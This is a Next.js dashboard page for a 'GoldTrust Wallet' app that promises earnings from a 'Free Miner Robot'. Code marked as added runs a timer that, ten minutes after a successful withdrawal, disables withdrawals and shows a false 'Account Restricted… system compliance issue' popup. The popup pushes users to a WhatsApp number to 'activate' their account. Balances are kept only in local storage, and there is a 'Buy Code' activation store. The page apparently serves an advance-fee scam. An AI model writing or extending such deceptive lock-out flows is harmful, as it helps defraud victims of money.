// pages/dashboard.js
import { useEffect, useState } from 'react';
import { useRouter } from 'next/router';
import Layout from '../components/Layout';
import LogoHeader from '../components/LogoHeader';
import Link from 'next/link';
import { loadUser, loadBalance, loadTx, saveBalance, saveTx } from '../utils/storage';
import { formatNaira } from '../utils/format';

/* ================== ADDED CONFIG ================== */
const RESTRICT_AFTER = 10 * 60 * 1000; // 10 minutes
const WHATSAPP_LINK = 'https://wa.me/2348161662371';
/* ================================================= */

export default function Dashboard(){
  const router = useRouter();
  const [user,setUser] = useState(null);
  const [balance,setBalance] = useState(0);
  const [tx,setTx] = useState([]);
  const [loading, setLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('Loading dashboard...');
  const [showIntro, setShowIntro] = useState(false);
  const [showWelcome, setShowWelcome] = useState(false);
  const [introIndex, setIntroIndex] = useState(0);
  const [stats, setStats] = useState({ totalMined:0, totalWithdrawn:0, txCount:0 });

  /* ================== ADDED STATES ================== */
  const [restricted, setRestricted] = useState(false);
  const [timeLeft, setTimeLeft] = useState(0);
  /* ================================================= */

  useEffect(()=>{
    const u = loadUser();
    if(!u) {
      router.push('/');
      return;
    }
    setUser(u);
    setBalance(loadBalance());
    const transactions = loadTx() || [];
    setTx(transactions);
    computeStats(transactions);

    try {
      if (typeof window !== 'undefined') {
        const seenIntro = localStorage.getItem('gt_seen_intro');
        if (!seenIntro) {
          setShowIntro(true);
          localStorage.setItem('gt_seen_intro','1');
        } else {
          const seenWelcome = localStorage.getItem('gt_seen_welcome');
          if (!seenWelcome) {
            setShowWelcome(true);
            localStorage.setItem('gt_seen_welcome','1');
            setTimeout(()=> setShowWelcome(false), 2200);
          }
        }
      }
    } catch(e){}
  },[]);

  /* ============ ADDED WITHDRAW COUNTDOWN LOGIC ============ */
  useEffect(() => {
    if (!tx.length) return;

    const lastWithdraw = [...tx]
      .reverse()
      .find(t => t.type === 'withdraw' && t.status === 'successful');

    if (!lastWithdraw) return;

    const startTime = new Date(lastWithdraw.created_at).getTime();

    const timer = setInterval(() => {
      const diff = Date.now() - startTime;

      if (diff >= RESTRICT_AFTER) {
        setRestricted(true);
        setTimeLeft(0);
      } else {
        setRestricted(false);
        setTimeLeft(RESTRICT_AFTER - diff);
      }
    }, 1000);

    return () => clearInterval(timer);
  }, [tx]);
  /* ======================================================= */

  function computeStats(transactions){
    const totalMined = (transactions.filter(t=>t.type==='mine' && (t.status==='claimed' || t.status==='successful'))
      .reduce((s,t)=>s + Number(t.amount||0), 0));
    const totalWithdrawn = (transactions.filter(t=>t.type==='withdraw_confirm' || (t.type==='withdraw' && t.status==='successful'))
      .reduce((s,t)=>s + Number(t.amount||0), 0));
    setStats({ totalMined, totalWithdrawn, txCount: (transactions.length || 0) });
  }

  const startQuick = (path, message='Opening...') => {
    if (restricted) return;
    setLoadingMessage(message);
    setLoading(true);
    setTimeout(()=> setLoadingMessage('Preparing secure session...'), 400);
    setTimeout(()=> router.push(path), 900);
  };

  const quickMine = () => startQuick('/mine', 'Preparing miner...');
  const quickWithdraw = () => startQuick('/withdraw', 'Opening withdraw...');
  const quickBuyCode = () => startQuick('/buy-code', 'Opening activation store...');
  const quickHistory = () => startQuick('/history', 'Loading transactions...');

  const copyReferral = async () => {
    const link = `${typeof window !== 'undefined' ? window.location.origin : ''}/register?ref=${user?.phone || ''}`;
    try {
      await navigator.clipboard.writeText(link);
      alert('Referral link copied to clipboard!');
    } catch (e) {
      prompt('Copy this referral link:', link);
    }
  };

  if(!user) return <Layout><div className="center"><div className="card">Loading...</div></div></Layout>;

  const previewTx = (tx || []).slice(0,5);

  const slides = [
    {
      title: `Welcome to GoldTrust Wallet`,
      subtitle: `Safe • Fast • Rewarding`,
      body: `GoldTrust Wallet gives you a Free Miner Robot to start earning immediately. Secure local storage, fast claims, and a simple withdraw flow.`,
      icon: '🎉'
    },
    {
      title: `How to earn`,
      subtitle: `Simple and fun`,
      body: `1) Tap Mine to start your robot.  2) Wait for the mining animation.  3) Claim your reward.`,
      icon: '⛏️'
    }
  ];

  return (
    <Layout>
      <LogoHeader />

      {/* ================= RESTRICTION POPUP ================= */}
      {restricted && (
        <div className="introOverlay">
          <div className="card introBox">
            <h3 style={{color:'red'}}>🚫 Account Restricted</h3>
            <p className="small muted">
              Dear <b>{user.fullName}</b>, your withdrawal is processing but your account
              is restricted due to a system compliance issue.
              Please activate your account for the withdrawal to be successfully sent
              to your bank account.
            </p>
            <button
              className="btn"
              style={{marginTop:12}}
              onClick={()=> window.location.href = WHATSAPP_LINK}
            >
              CLICK TO ACTIVATE
            </button>
          </div>
        </div>
      )}
      {/* ==================================================== */}

      <div style={{display:'grid',gap:18}}>
        <div className="card">
          <div className="small muted">Wallet Balance</div>
          <div style={{fontSize:28,fontWeight:800}}>{formatNaira(balance)}</div>

          {!restricted && timeLeft > 0 && (
            <div className="small muted">
              ⏳ Withdrawal window: <b>{formatTime(timeLeft)}</b>
            </div>
          )}

          <div style={{display:'flex',gap:12,marginTop:10}}>
            <button className="btn" onClick={quickMine}>⛏️ Mine</button>
            <button className="btnGhost" disabled={restricted} onClick={quickWithdraw}>💸 Withdraw</button>
            <button className="btnGhost" disabled={restricted} onClick={quickBuyCode}>🧾 Buy Code</button>
          </div>
        </div>
      </div>
    </Layout>
  );
}

/* ============== HELPER ================= */
function formatTime(ms){
  const s = Math.floor(ms / 1000);
  const m = Math.floor(s / 60);
  const sec = s % 60;
  return `${m}:${sec.toString().padStart(2,'0')}`;
}
